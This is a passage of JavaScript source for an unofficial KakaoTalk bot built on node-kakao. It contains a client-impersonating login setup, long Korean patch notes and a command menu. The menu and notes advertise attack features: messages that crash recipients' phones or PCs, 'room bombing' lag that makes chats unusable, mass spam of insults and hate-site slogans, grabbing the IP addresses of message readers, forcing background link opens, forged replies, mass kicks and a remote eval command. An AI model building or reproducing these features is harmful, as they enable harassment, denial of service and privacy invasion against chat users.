                    '\n   LOGIN: TRUE',
                    '\n*************************************************************************',
                    '\n',
                    '\n');
                //
                SessionWebClient = await node_kakao.api.createSessionWebClient(
                    loginRes.result,
                    {
                        locoBookingHost: "booking-loco.kakao.com",
                        locoBookingPort: 443,
                        locoPEMPublicKey: `---- - BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEApElgRBx + g7sniYFW7LE8ivrwXShKTRFV8lXNItMXbN5QSC8vJ / cTSOTS619Xv5Zx7xXJIk4EKxtWesEGbgZpEUP2xQ + IeH9oz0JxayEMvvD1nVNAWgpWE4pociEoArsK7qY3YwXb1CiDHo9hojLv7djbo3cwXvlyMh4TUrX2RjCZPlVJxk / LVjzcl9ohJLkl3eoSrf0AE4kQ9mk3 + raEhq5Dv + IDxKYX + fIytUWKmrQJusjtre9oVUX5sBOYZ0dzez / XapusEhUWImmB6mciVXfRXQ8IK4IH6vfNyxMSOTfLEhRYN2SMLzplAYFiMV536tLS3VmG5GJRdkpDubqPeQIBAw ==\n----- END PUBLIC KEY-----`,
                        agent: "win32",
                        version: "3.3.8",
                        appVersion: "3.3.8.3058",
                        osVersion: "10.0",
                        deviceType: 2,
                        netType: 0,
                        mccmnc: "999",
                        countryIso: "KR",
                        language: "ko",
                        subDevice: true,
                        deviceModel: "",
                        loginTokenSeedList: ["PITT", "INORAN"],
                    },
                    "https",
                    "katalk.kakao.com"
                );
            } else {
                console.log("   >> 로그인에 실패했습니다! 오류내용(코드): " + res.status);
            };
        };

        function noAsync() {
            setInterval(function () {
                importAdmin();
            }, 30000);
        };

        async function sendLong(_kakaoChannel, text1, text2) {
            /*try {
                var r = await $AttachmentApi.upload(1, "long", text2);
                _kakaoChannel.sendChat(
                    new $ChatBuilder().text(text1).append(new $AttachmentContent(r.result)).build(1)
                );
            } catch (e) {
                _kakaoChannel.sendChat(e);
            };*/
            _kakaoChannel.sendChat(text1 + "\n" + "\u200b".repeat(500) + text2);
        };

        function sendPatch(_kakaoChannel) {
            sendLong(_kakaoChannel, "[모든 봇 버전 패치노트]", "" +
                "\n[------------------패치예정------------------]" +
                "\n|  1.  다중 키워드 추가" +
                "\n|  2.  지하철/버스 도착시간 확인기능 추가" +
                "\n|  3.  사용자 차단" +
                "\n[------------------V10.0.6------------------]" +
                "\n|  1.  tts 명령어 추가" +
                "\n|  2.  권한 명령어 추가" +
                "\n[------------------V10.0.5------------------]" +
                "\n|  1.  전광판 명령어 추가"+
                "\n[------------------V10.0.2------------------]" +
                "\n|  1.  화면임티 명령어 추가" +
                "\n|  2.  임티5 명령어 추가" +
                "\n|  3.  블랙, 블랙해제 명령어 추가" +
                "\n|  4.  내정보 명령어 추가" +
                "\n|  5.  evalue 명령어 추가" +
                "\n|  6.  방폭청소 명령어 추가" +
                "\n[------------------V10.0.1------------------]" +
                "\n|  1.  옾챗 방생성 명령어 추가" +
                "\n|  2.  옾챗 방생성 명령어 추가" +
                "\n[------------------V10.0.0------------------]" +
                "\n|  1.  카카오TV 명령어 추가" +
                "\n|  1-1.  tv-on" +
                "\n|  1-2.  tvlive-on" +
                "\n|  1-3.  tv-off" +
                "\n|  1-4.  tvq" +
                "\n|  2.  openq 명령어 추가" +
                "\n|  3.  강제오류 아이폰 명령어 제거" +
                "\n|  4.  ium 명령어 추가" +
                "\n|  5.  live-on,off,re 명령어 추가" +
                "\n|  6.  로그 -> 콘솔로그, 메세지로그 업그레이드" +
                "\n|  7.  삭제, 일괄삭제 명령어 추가" +
                "\n|  8.  모두멘션, 투명멘션 패치" +
                "\n|  9.  방제목, 방프사 고정&해제 명령어 추가" +
                "\n|  9-1.  방제고정, 방제고정해제 명령어 추가" +
                "\n|  9-2.  방프고정, 방프고정해제 명령어 추가" +
                "\n|  10.  도배 노짱, 도배중지 노짱 명령어 추가" +
                "\n|  11.  공지 명령어 추가" +
                "\n|  12.  롱텍 명령어 추가" +
                "\n|  13.  프사 명령어 추가" +
                "\n|  14.  반복모두멘션, 반복투명멘션 명령어 추가" +
                "\n|  15.  희선이 명령어 추가" +
                "\n|  16.  방제설정 -> 방제" +
                "\n|  16.  방프 명령어 추가" +
                "\n|  17.  방폭, 방폭중지 명령어 추가" +
                "\n[------------------V7.4------------------]" +
                "\n|  1.  카카오톡 클라이언트 버전 업그레이드" +
                "\n|  2.  '-500' 오류 해결" +
                "\n|  3.  강제오류 아이폰 명령어 추가" +
                "\n|  4.  단톡렉 명령어 추가" +
                "\n[------------------V7.3------------------]" +
                "\n|  1.  모두멘션 패치" +
                "\n|  2.  방제설정 명령어 추가" +
                "\n|  3.  투명 전체멘션 추가" +
                "\n[------------------V7.2------------------]" +
                "\n|  1.  아이피 명령어 패치 (아이피 시작 중복 가능)" +
                "\n|  2.  다중로그인 안되는 버그 패치" +
                "\n|  3.  모듈 최적화" +
                "\n[------------------V7.1------------------]" +
                "\n|  1.  아이피 시작 명령어 안됨 버그 패치" +
                "\n[------------------V7.0------------------]" +
                "\n|  1.  인증코드 버그 패치" +
                "\n|  2.  모두멘션 버그 패치" +
                "\n[------------------V6.8------------------]" +
                "\n|  1.  해시태그2 삭제, 해시태그 -> 강제읽기" +
                "\n|  2.  모두멘션 전송 속도 제한" +
                "\n|  3.  금지어 입력 감지시 프로그램 꺼짐 패치" +
                "\n|  4.  아이피로그 필터링 켜기/끄기 명령어 추가" +
                "\n[------------------V6.7------------------]" +
                "\n|  1.  강퇴해제 명령어 추가" +
                "\n|  2.  메세지로그 명령어 추가" +
                "\n|  3.  아이피로깅 명령어 추가" +
                "\n[------------------V6.6------------------]" +
                "\n|  1.  인증코드 입력 도중에 다음 계정으로 넘어가는 버그 패치" +
                "\n[------------------V6.5------------------]" +
                "\n|  1.  다중로그인 버그 패치" +
                "\n[------------------V6.4------------------]" +
                "\n|  1.  인증코드 입력 안됨 그 패치" +
                "\n|  2.  강제오류 폰 오픈채팅 버그 패치" +
                "\n|  3.  강제오류 컴 오픈채팅 버그 패치" +
                "\n|  4.  삭제 명령어 삭제" +
                "\n|  5.  채팅금지 프로그램 꺼짐 버그 패치" +
                "\n|  6.  위임 명령어 패치" +
                "\n[------------------V6.3------------------]" +
                "\n|  1.  관리자명령어 버그 패치" +
                "\n[------------------V6.2------------------]" +
                "\n|  1.  아이디 버그 패치" +
                "\n|  2.  위임 버그 패치" +
                "\n|  3.  채팅금지 패치" +
                "\n|  4.  컴튕/폰튕 도배 추가" +
                "\n[------------------V6.1------------------]" +
                "\n|  1.  commandMode 오류 해결" +
                "\n|  2.  AdminList & App정보 오류 해결" +
                "\n|  1.  commandMode 오류 해결" +
                "\n[------------------V6.0------------------]" +
                "\n|  1.  미세먼지 명령어 삭제" +
                "\n|  2.  날씨 명령어 업그레이드" +
                "\n|  3.  일부 명령어 채팅방 구별 패치" +
                "\n|  4.  여러계정 로그인 추가" +
                "\n[------------------V5.7------------------]" +
                "\n|  1.  각종 관리자 명령어 버그 패치" +
                "\n|  2.  오픈채팅, 일반채팅 명령어 자동구분 패치" +
                "\n|  2-1.  투표2 -> 투표" +
                "\n|  2-2.  오픈채팅용 글쓰기 명령어 추가" +
                "\n|  2-3.  강제오류2 -> 강제오류" +
                "\n[------------------V5.6------------------]" +
                "\n|  1.  오픈채팅 벤키워드 감지 추가" +
                "\n|  2.  사용자인증 오픈채팅만 감지되게 패치" +
                "\n|  3.  날씨 명령어 패치" +
                "\n|  4.  임티 2,3,4 관리자 명령어로 변경" +
                "\n[------------------V5.5------------------]" +
                "\n|  1.  모두멘션 방식 패치" +
                "\n|  2.  오픈채팅 사람인증 추가" +
                "\n[------------------V5.4------------------]" +
                "\n|  1.  강제오류 컴 명령어 패치" +
                "\n|  2.  오픈채팅 강제오류 명령어 패치" +
                "\n|  3.  관리자 목록 저장" +
                "\n|  4.  감지 명령어 패치" +
                "\n|  5.  감지목록 명령어 추가" +
                "\n|  6.  eval 명령어 추가" +
                "\n[------------------V5.3------------------]" +
                "\n|  1.  임티번호 명령어 추가" +
                "\n|  2.  프로그램에 디바이스 인증기능 추가" +
                "\n|  3.  '어드민' 명령어 추가" +
                "\n|  4.  '강제오류2' 명령어 추가" +
                "\n|  5.  명령어 종류 분리" +
                "\n[------------------V5.2------------------]" +
                "\n|  1.  오픈채팅 명령어 패치" +
                "\n|  1-1.  강퇴 명령어" +
                "\n|  1-2.  방정보 명령어" +
                "\n|  1-3.  모두멘션 명령어" +
                "\n|  1-4.  채금 명령어" +
                "\n|  1-5.  일괄강퇴 명령어" +
                "\n|  2.  삭제 명령어 버그 수정" +
                "\n|  3.  가리기 명령어를 하나만 가리는걸로 패치" +
                "\n|  3-1.  모든 메세지를 가리는 명령어는 삭제됐습니다." +
                "\n|  3-2.  앞으로 채팅청소 명령어를 써주세요." +
                "\n|  4.  '글쓰기2' 명령어 삭제" +
                "\n|  5.  '강제오류' 명령어 추가" +
                "\n|  6.  '채팅청소' 명령어에 강도 조절 추가" +
                "\n|  7.  '부방', '봇' 명령어 삭제" +
                "\n|  8.  '프로필' 명령어 추가 (사용자 프로필 따기)" +
                "\n|  9.  '날씨' 명령어 버그 수정" +
                "\n[------------------V5.1------------------]" +
                "\n|  1.  도배 멘션 명령어 버그 수정" +
                "\n|  2.  도배 문자 명령어 추가" +
                "\n|  3.  '따라해' 명령어 추가" +
                "\n[------------------V5.0------------------]" +
                "\n|  1.  NODE-KAKAO V4로 이전" +
                "\n|  1-1.  패킷 안정화" +
                "\n|  1-2.  각종 버그 수정" +
                "\n|  2.  한강 명령어 버그 수정" +
                "\n|  3.  미세먼지 확인 명령어 추가" +
                "\n|  3-1.  대한민국 안의 지역 확인만 가능" +
                "\n|  3-2.  나머지 나라 지역은 가능은 하지만 글자 오류" +
                "\n|  4.  암호화폐 시세 확인 명령어 추가" +
                "\n|  4-1. 지원 돈 단위: KRW/USD/EUR/CNY" +
                "\n|  4-2. 지원 암호화폐: BTC/ETH/EOS/XRP" +
                "\n|  5.  이모티콘 종류 추가" +
                "\n|  5-1.  이모티콘 고유번호 지정 사용" +
                "\n|  5-2.  이모티콘 고유번호&크기 지정 사용" +
                "\n|  5-3.  유료이모티콘도 사용 가능" +
                "\n|  6.  읽은사람 확인기능 일반 채팅에서도 가능" +
                "\n|  7.  방정보 명령어 : 정보 세부화" +
                "\n|  8.  모두멘션 명령어 : 멘션방식 변경 (안정화)" +
                "\n|  5.  글쓰기 명령어 패치" +
                "\n|  5-1.  컴퓨터에서는 글쓰기 글자가 안보이던 버그 수정" +
                "\n|  5-2.  오픈채팅 전용 글쓰기 명령어 추가" +
                "\n|  6.  투표 명령어 추가 (오픈채팅 전용 명령어 따로 추가)" +
                "\n|  7.  정보 확인 기능에 답장 기능 추가" +
                "\n|  8.  전체보기 명령어 추가 (짧은글도 전체보기가 되게)" +
                "\n[------------------V4.6------------------]" +
                "\n|  1.  한강 명령어 버그 수정" +
                "\n|  2.  미세먼지 확인 명령어 추가" +
                "\n|  2-1.  대한민국 안의 지역 확인만 가능" +
                "\n|  2-2.  나머지는 가능은 하지만 글자 오류" +
                "\n|  3.  암호화폐 시세 확인 명령어 추가" +
                "\n|  3-1. 지원 돈 단위: KRW/USD/EUR/CNY" +
                "\n|  3-2. 지원 암호화폐: BTC/ETH/EOS/XRP" +
                "\n[------------------V4.5------------------]" +
                "\n|  1.  답장조작 기능 추가" +
                "\n|  2.  명령어 안정화" +
                "\n|  3.  이모티콘 버그 수정 & 각종 기능추가" +
                "\n|  3-1.  '임티'의 이모티콘번호 선택가능" +
                "\n|  3-2.  '임티2'의 이모티콘번호 선택가능 & 크기조절가능" +
                "\n|  4.  변수 + 각종 코드 등등 최적화" +
                "\n|  5.  키워드 명령어 추가" +
                "\n|  5-1.  키워드로 기존 명령어 없이 같은 기능 발동" +
                "\n|  5-2.  키워드로 티안나게 명령어 사용 가능" +
                "\n[--------------------V4.1~V4.4--------------------]" +
                "\n|  1. 각종 명령어 추가 & 버그 패치" +
                "\n[------------------V4.0------------------]" +
                "\n|  1.  NODE-KAKAO V3 으로 이전" +
                "\n|  2.  '칭호' 명령어 추가" +
                "\n|  3.  '자가진단' 명령어 추가" +
                "\n|  4.  '임티' 명령어 추가" +
                "\n[------------------V3.2------------------]" +
                "\n|  1.  '검색' 명령어 더 많이 추가" +
                "\n|  2.  '자동등록' 추가" +
                "\n|  3.  '위임' 추가" +
                "\n|  4.  '감지' 추가" +
                "\n[------------------V3.1------------------]" +
                "\n|  1.  '명령어' 추가" +
                "\n|  2.  '정보' 명령어 추가" +
                "\n|  3.  '검색' 명령어 추가" +
                "\n[------------------V3.0------------------]" +
                "\n|  1.  '도배' 추가 (멘션 +랜덤)" +
                "\n[--------------------V1.0~V2.7--------------------]" +
                "\n|  1. 각종 명령어 추가 & 버그 패치" +
                "");
        };

        var commands = [
            "\n[-------------------봇정보-------------------]" +
            "\n|  봇 개발자 (디코): williameom_#6512" +
            "\n|  봇 기반: node-kakao v" + kakaoVer +
            "\n|  마지막 패치날짜: " + lastUpdate +
            "\n|  봇 버전: " + ver +
            "\n|  봇 리포지터리: https://github.com/Kakaotalk-loco/kakaotalk-loco-bot-example" +
            "\n" +
            "\n[------------------패치노트------------------]" +
            "\n|  1.  노드카카오 버전 패치" +
            "\n|  2.  전광판 명령어 추가 " +
            "\n|  3.  tts 명령어 추가" +
            "\n[------------------패치예정------------------]" +
            "\n|  1.  다중 키워드 추가" +
            "\n|  2.  지하철/버스 도착시간 확인기능 추가" +
            "\n|  3.  사용자 차단" +
            "\n" +
            "\n" +
            "\n[----------------명령어가이드----------------]" +
            "\n|  ≫ <> : 필수" +
            "\n|  ≫ [] : 선택" +
            "\n|  ≫ ;; : 설명" +
            "\n|  ≫ ✅ : 1대1채팅에서 사용 가능" +
            "\n|  ≫ 🔳 : 그룹채팅에서 사용 가능" +
            "\n|  ≫ 🔲 : 오픈채팅에서 사용 가능" +
            "\n[------------------기본기능------------------]" +
            "\n|  " + prefix + "오류 ✅🔳🔲" +
            "\n|  ≫ 명령어에 오류가 있을경우 출력 (일부한정)" +
            "\n|  " + prefix + "현재로그 ✅🔳🔲" +
            "\n|  ≫ 명령어를 쓰면서 보낸 메세지의 로그 확인" +
            "\n|  " + prefix + "패치노트 ✅🔳🔲" +
            "\n|  ≫ 모든 버전의 패치노트 확인" +
            "\n|  " + prefix + "작동 ✅🔳🔲" +
            "\n|  ≫ 봇이 작동중인지 확인" +
            "\n|  " + prefix + "공지 <내용> 🔳" +
            "\n|  ≫ 공지형태 글을 쓴다 (실제O)" +
            "\n|  " + prefix + "글쓰기 <내용> ✅🔳🔲" +
            "\n|  ≫ 공지형태 글을 쓴다 (실제X)" +
            "\n|  " + prefix + "투표 <제목>%<항목1> ✅🔳🔲" +
            "\n|  ≫ 투표를 전송한다. (실제X)" +
            "\n|  " + prefix + "전체보기 <내용> ✅🔳🔲" +
            "\n|  ≫ 짧은 글도 전체보기형태가 되게 만든다" +
            "\n|  " + prefix + "날씨 <국가> ✅🔳🔲" +
            "\n|  ≫ 지정한 나라의 날씨를 확인한다" +
            "\n|  " + prefix + "한강 ✅🔳🔲" +
            "\n|  ≫ 한강 수온을 확인한다" +
            "\n|  " + prefix + "미세먼지 <지역> ✅🔳🔲" +
            "\n|  ≫ 지정한 지역의 미세먼지 농도를 확인한다" +
            "\n|  " + prefix + "암호화폐 <단위> ✅🔳🔲" +
            "\n|  ≫ 암호화폐 시세를 확인한다 (단위:KRW/USD/EUR/CNY)" +
            "\n|  " + prefix + "정보 <@멘션/답장형태> ✅🔳🔲" +
            "\n|  사용자의 정보 확인" +
            "\n|  " + prefix + "프로필 <@멘션/답장형태/아이디> ✅🔳🔲" +
            "\n|  사용자의 프로필 가져오기" +
            "\n|  " + prefix + "보이스톡 ✅" +
            "\n|  ≫ 보이스톡을 건다 (버그)" +
            "\n|  " + prefix + "검색 <내용> ✅🔳🔲" +
            "\n|  ≫ 구글에서 검색" +
            "\n|  " + prefix + "다음검색 <내용> ✅🔳🔲" +
            "\n|  ≫ 다음에서 검색" +
            "\n|  " + prefix + "네이버검색 <내용> ✅🔳🔲" +
            "\n|  ≫ 네이버에서 검색" +
            "\n|  " + prefix + "유튜브검색 <내용> ✅🔳🔲" +
            "\n|  ≫ 유튜브에서 검색" +
            "\n|  " + prefix + "유튜브검색 <내용> ✅🔳🔲" +
            "\n|  ≫ 유튜브에서 검색" +
            "\n|  " + prefix + "자가진단 <학교코드> <학년> <반> ✅🔳🔲" +
            "\n|  ≫ 자가진단 현황 확인" +
            "\n|  " + prefix + "따라해 <글> ✅🔳🔲" +
            "\n|  ≫ 봇이 따라말한다." +
            "\n|  " + prefix + "임티 <번호> ✅🔳🔲" +
            "\n|  ≫ 이모티콘 전송 (번호: 1~48) (니니즈)" +
            "\n|  " + prefix + "ytdl <유튜브 링크> 🔲" +
            "\n|  ≫ 유튜브 음원을 음성메시지로 보내줍니다." +
            "\n|  " + prefix + "vid-ytdl <유튜브 링크> 🔲" +
            "\n|  ≫ 유튜브 음원을 동영상으로 보내줍니다." +
            "\n|  " + prefix + "전광판 <상행행선지>%<출발역>%<0=도착,1=출발>%<하행행선지>%<출발역>%<0=도착,1=출발> ✅🔳🔲" + // 용산%인천%출발%인천%용산%접근
            "\n|  ≫ 한국철도공사 행선지 전광판을 흉내냅니다." +
            "\n|  " + prefix + "tts-help" +
            "\n|  ≫ tts 명령어 도움말을 보여줍니다." +
            "\n[------------------관리기능------------------]" +
            "\n|  ■■■■ 특수관리기능 ■■■■" +
            "\n|  " + prefix + "자동등록 ✅🔳🔲" +
            "\n|  ≫ 미리 정해진 유저일 경우 자동으로 관리자 위임" +
            "\n|  " + prefix + "위임 <ID> ✅🔳🔲" +
            "\n|  ≫ 특정 유저를 관리자로 위임" +
            "\n|  " + prefix + "괄자 ✅🔳🔲" +
            "\n|  ≫ 관리자 목록 확인" +
            "\n|  " + prefix + "칭호 <문자> ✅🔳🔲" +
            "\n|  ≫ 명령어 칭호를 변경 (예)(!정보 -> ~정보)" +
            "\n|  " + prefix + "종료 ✅🔳🔲" +
            "\n|  ≫ 프로그램 종료" +
            "\n|  ■■■■ 관리기능 ■■■■" +
            "\n|  " + prefix + "희선이 ✅🔳🔲" +
            "\n|  ≫ 상대방 아버지 위치 전송" +
            "\n|  " + prefix + "욕 ✅🔳🔲" +
            "\n|  ≫ 랜덤 욕 멘트장 전송" +
            "\n|  " + prefix + "프사 <멘션> 🔳" +
            "\n|  ≫ 사용자 프로필 사진 전송" +
            "\n|  " + prefix + "방프 <링크> 🔳" +
            "\n|  ≫ 모두에게 방 프로필 사진 변경" +
            "\n|  " + prefix + "방프고정 <링크> 🔳" +
            "\n|  ≫ 방 프사 고정" +
            "\n|  " + prefix + "방프고정해제 🔳" +
            "\n|  ≫ 방 프사 고정 해제" +
            "\n|  " + prefix + "방제 <방제목> 🔳" +
            "\n|  ≫ 모두에게 방 제목 변경" +
            "\n|  " + prefix + "방제고정 <방제목> 🔳" +
            "\n|  ≫ 방 제목 고정" +
            "\n|  " + prefix + "방제고정해제 🔳" +
            "\n|  ≫ 방 제목 고정 해제" +
            "\n|  " + prefix + "tv-on <링크> 🔳🔲" +
            "\n|  ≫ 링크로 TV 시청" +
            "\n|  " + prefix + "tvlive-on <링크> 🔳🔲" +
            "\n|  ≫ 링크로 TV 라이브 시청" +
            "\n|  " + prefix + "tv-off 🔳🔲" +
            "\n|  ≫ 시청중인 TV 종료" +
            "\n|  " + prefix + "tvq <키워드> ✅🔳🔲" +
            "\n|  ≫ 카카오티비 검색" +
            "\n|  " + prefix + "openq <키워드> ✅🔳🔲" +
            "\n|  ≫ 오픈채팅 검색" +
            "\n|  " + prefix + "live-on ✅🔳" +
            "\n|  ≫ 라이브톡 시작" +
            "\n|  " + prefix + "live-off ✅🔳" +
            "\n|  ≫ 라이브톡 종료" +
            "\n|  " + prefix + "live-re ✅🔳" +
            "\n|  ≫ 라이브톡 재시작" +
            "\n|  " + prefix + "위치정보 <아이피> ✅🔳🔲" +
            "\n|  ≫ 아이피의 위치정보 확인" +
            "\n|  " + prefix + "삭제 ✅🔳🔲" +
            "\n|  ≫ 답장 형태로 적을시 해당 메세지 삭제" +
            "\n|  " + prefix + "일괄삭제 ✅🔳🔲" +
            "\n|  ≫ 해당 메세지부터 아래로 70개의 메세지 삭제" +
            "\n|  " + prefix + "강제오류 <폰/컴> 🔳🔲" +
            "\n|  ≫ 읽으면 오류가 뜨는 메세지 전송" +
            "\n|  " + prefix + "ium ✅🔳🔲" +
            "\n|  ≫ 아이폰에서만 보이는 이모티콘 전송" +
            "\n|  " + prefix + "단톡렉 🔳" +
            "\n|  ≫ 폰에서 심한 렉을 유발하는 메세지 전송" +
            "\n|  " + prefix + "읽은사람 ✅🔳🔲" +
            "\n|  ≫ 메세지에 답장형태로 적으면 해당 메세지를 읽은사람을 전송" +
            "\n|  " + prefix + "답장 <글>%<글> ✅🔳🔲" +
            "\n|  ≫ 답장형태로 적을시 해당 사람이 적은 글을 조작해 답장을 한다" +
            "\n|  " + prefix + "키워드 ✅🔳🔲" +
            "\n|  ≫ 현재 설정된 키워드 설명 확인" +
            "\n|  " + prefix + "키워드 <키워드> <명령어이름> <옵션> ✅🔳🔲" +
            "\n|  ≫ 설정한 키워드랑 똑같은 채팅을 입력하면 명령어 발동" +
            "\n|  ≫ 현재 지원중인 키워드: 해시태그" +
            "\n|  " + prefix + "키워드삭제 ✅🔳🔲" +
            "\n|  ≫ 설정된 키워드 삭제" +
            "\n|  " + prefix + "임티 <번호>" +
            "\n|  ≫ 이모티콘 전송 (번호: 1~48)" +
            "\n|  " + prefix + "임티2 <번호> <크기> ✅🔳🔲" +
            "\n|  ≫ 이모티콘 크기조절 전송 (번호: 1~48)(니니즈)(추천크기: 1000이상)" +
            "\n|  " + prefix + "임티3 <고유번호> <번호> <옵션 1/2> ✅🔳🔲" +
            "\n|  ≫ 지정한 이모티콘 전송 (카카오톡의 모든 이모티콘 지원, 유료 가능) (옵션1: 안움직이는임티)(옵션2: 움직이는임티)" +
            "\n|  " + prefix + "임티4 <고유번호> <번호> <크기> <옵션 1/2> ✅🔳🔲" +
            "\n|  ≫ 임티3의 크기조절 전송 (옵션1: 안움직이는임티)(옵션2: 움직이는임티)" +
            "\n|  " + prefix + "임티5 <고유번호> <번호> ✅🔳🔲" +
            "\n|  ≫ 화면에 그림이 뜨는 이모티콘 전송" +
            "\n|  " + prefix + "화면임티 ✅🔳🔲" +
            "\n|  ≫ 화면에 그림이 뜨는 이모티콘" +
            "\n|  " + prefix + "방정보 ✅🔳🔲" +
            "\n|  ≫ 방 정보 확인" +
            "\n|  " + prefix + "채팅청소 [강도] ✅🔳🔲" +
            "\n|  ≫ 채팅청소를 한다" +
            "\n|  " + prefix + "감지 <@멘션/아이디> ✅🔳🔲" +
            "\n|  ≫ 해당 채널에서 지정한 사람이 아무 메세지나 읽을경우 메세지전송" +
            "\n|  " + prefix + "강제읽기 <링크> ✅🔳🔲" +
            "\n|  ≫ 사용자가 강제로 백그라운드로 링크 접속" +
            "\n|  " + prefix + "도배 랜덤 ✅🔳🔲" +
            "\n|  ≫ 랜덤문자 도배" +
            "\n|  " + prefix + "도배중지 랜덤 ✅🔳🔲" +
            "\n|  ≫ 랜덤문자 도배 중지" +
            "\n|  " + prefix + "도배 멘션 ✅🔳🔲" +
            "\n|  ≫ 멘션 도배" +
            "\n|  " + prefix + "도배중지 멘션 ✅🔳🔲" +
            "\n|  ≫ 멘션 도배 중지" +
            "\n|  " + prefix + "도배 노짱 ✅🔳🔲" +
            "\n|  ≫ 일베 멘트 도배" +
            "\n|  " + prefix + "도배중지 노짱 ✅🔳🔲" +
            "\n|  ≫ 일베 멘트 도배 중지" +
            "\n|  " + prefix + "도배 문자 <글> ✅🔳🔲" +
            "\n|  ≫ 특정 글 도배" +
            "\n|  " + prefix + "도배중지 문자 ✅🔳🔲" +
            "\n|  ≫ 특정 문자 도배하기 중지" +
            "\n|  " + prefix + "도배 폰튕 ✅🔳🔲" +
            "\n|  ≫ 폰튕기기 도배" +
            "\n|  " + prefix + "도배중지 폰튕 ✅🔳🔲" +
            "\n|  ≫ 폰튕기기 도배 중지" +
            "\n|  " + prefix + "도배 욕 ✅🔳🔲" +
            "\n|  ≫ 욕 멘트장 랜덤 도배" +
            "\n|  " + prefix + "도배중지 욕 ✅🔳🔲" +
            "\n|  ≫ 욕 멘트장 랜덤 도배 중지" +
            "\n|  " + prefix + "도배 컴튕 ✅🔳🔲" +
            "\n|  ≫ 컴튕기기 도배" +
            "\n|  " + prefix + "도배중지 컴튕 ✅🔳🔲" +
            "\n|  ≫ 컴튕기기 도배 중지" +
            "\n|  " + prefix + "콘솔로그 ✅🔳🔲" +
            "\n|  ≫ 모든 들어가있는 채팅방의 채팅 로그" +
            "\n|  " + prefix + "내정보 ✅🔳🔲" +
            "\n|  ≫ 자신의 프로필을 불러온다" +
            "\n|  " + prefix + "블랙 <아이디> ✅🔳🔲" +
            "\n|  ≫ 사용자의 모든 채팅 무시" +
            "\n|  " + prefix + "블랙해제 <아이디> ✅🔳🔲" +
            "\n|  ≫ 블랙 명령어 해제" +
            "\n|  " + prefix + "evalue ✅🔳🔲" +
            "\n|  ≫ 답장형태로 적으면 eval값을 따온다" +
            "\n|  " + prefix + "모두멘션 ✅🔳🔲" +
            "\n|  ≫ 모든유저 멘션" +
            "\n|  " + prefix + "투명멘션 ✅🔳🔲" +
            "\n|  ≫ 모든유저 투명메세지로 멘션" +
            "\n|  " + prefix + "방폭 ✅🔳🔲" +
            "\n|  ≫ 극대량의 렉을 유발해 방 사용을 불가능하게 만들기" +
            "\n|  " + prefix + "방폭중지 ✅🔳🔲" +
            "\n|  ≫ 방폭 명령어 중지" +
            "\n|  " + prefix + "방폭청소 ✅🔳🔲" +
            "\n|  ≫ 마지막으로 방폭 명령어를 사용한 방 청소" +
            "\n|  " + prefix + "반복모두멘션 <횟수> ✅🔳🔲" +
            "\n|  ≫ 모두멘션 반복" +
            "\n|  " + prefix + "반복투명멘션 <횟수> ✅🔳🔲" +
            "\n|  ≫ 투명멘션 반복" +
            "\n|  " + prefix + "가리기 🔲" +
            "\n|  ≫ 답장형태로 적을시 해당 채팅 가리기" +
            "\n|  " + prefix + "채금 <@멘션> 🔲" +
            "\n|  ≫ 해당 유저의 모든 전송되는 채팅 가리기" +
            "\n|  " + prefix + "채금해제 <@멘션> 🔲" +
            "\n|  ≫ 해당 유저의 채팅가리기 해제" +
            "\n|  " + prefix + "아이피 <시작/종료/필터링켜기/필터링끄기> ✅🔳🔲" +
            "\n|  ≫ 메세지를 읽는사람의 아이피 따고 채팅방에 전송" +
            "\n|  " + prefix + "입장 <옾챗링크> ✅🔳🔲" +
            "\n|  ≫ 오픈채팅방 입장" +
            "\n|  " + prefix + "강퇴 <@멘션> 🔲" +
            "\n|  ≫ 해당 유저 강퇴" +
            "\n|  " + prefix + "강퇴해제 <유저아이디> 🔲" +
            "\n|  ≫ 해당 유저 강퇴 해제" +
            "\n|  " + prefix + "일괄강퇴 🔲" +
            "\n|  ≫ 모든유저 강퇴" +
            "\n[------------------개발기능------------------]" +
            "\n|  " + prefix + "채팅타입 ✅🔳🔲" +
            "\n|  ≫ 모든 채팅타입 확인" +
            "\n|  " + prefix + "임티번호 ✅🔳🔲" +
            "\n|  ≫ 이모티콘들의 번호를 확인합니다" +
            "\n|  " + prefix + "메세지로그 ✅🔳🔲" +
            "\n|  ≫ 답장형태로 적으면 해당 채팅 정보 발송" +
            "\n|  " + prefix + "eval <구문> ✅🔳🔲" +
            "\n|  ≫ node js에서 해당 코드를 실행합니다" +
            "\n|  " + prefix + "어드민 ✅🔳🔲" +
            "\n|  ≫ 모든 명령어들을 막습니다" +
            "\n|  ≫ 주로 기능을 테스트하거나 개발할때 사용합니다"
        ];


        function importAdmin() {
            fs.readFile('./bot/adminlist.txt', 'utf8', function (err, data) {
                adminList = [];
                var adminListRead = data.split(/\r?\n/);
                var count = 0;
                for (var i = 0; i < adminListRead.length; i++) {
                    count = i;
                    adminList.push(adminListRead[i]);
                };
            });
        };

        function getProfile(_kakaoChannel, id) {
            _kakaoChannel.sendChat(
                new $ChatBuilder()
                    .text("카카오톡 프로필")
                    .append(new $AttachmentContent({
                        "userId": id,
                        "nickName": "",
                        "fullProfileImageUrl": "",
                        "profileImageUrl": "",
                        "statusMessage": ""
                    }))
                    .build(17)
            );
        };

        function sendLinkEmbed(_kakaoChannel, _text, _link) {
            try {
                _kakaoChannel.sendChat(
                    new $ChatBuilder().append(new $AttachmentContent({
                        "L": _link,
                        "Q": _text,
                        "V": "image",
                        "R": [
                            {
                                "D": _text,
                                "L": _link,
                                "I": _link,
                                "W": 100,
                                "H": 100
                            }
                        ]
                    })).build(23)
                );
            } catch (error) {
                outError = error + "$%^%$";
                outError = outError.replace("$%^%$", "");
                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
            };
        };

        function pausecomp(millis) {
            var date = new Date();
            var curDate = null;
            do {
                curDate = new Date();
            } while (curDate - date < millis);
        };

        function sendrawch(t, t2, t3) {
            return new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent(t3)).text(t2).build(t);
        };

        function mentionAll(_kakaoChannel, _allRepeat, _delay, _mentionType, _msg) {
            try {
                var allRepeated = 0;
                var userList = Array.from(_kakaoChannel.getAllUserInfo()); //_kakaoChannel.getUserAsObject();
                var mentionUserCount = _kakaoChannel.userCount - 1;
                if (mentionUserCount > 15) {
                    var repeatAmount1 = parseInt(mentionUserCount / 15); //몫
                    var repeatAmount2 = mentionUserCount % 15; //나머지
                    var msgSendAmount = repeatAmount1;
                    if (repeatAmount2 > 0) {
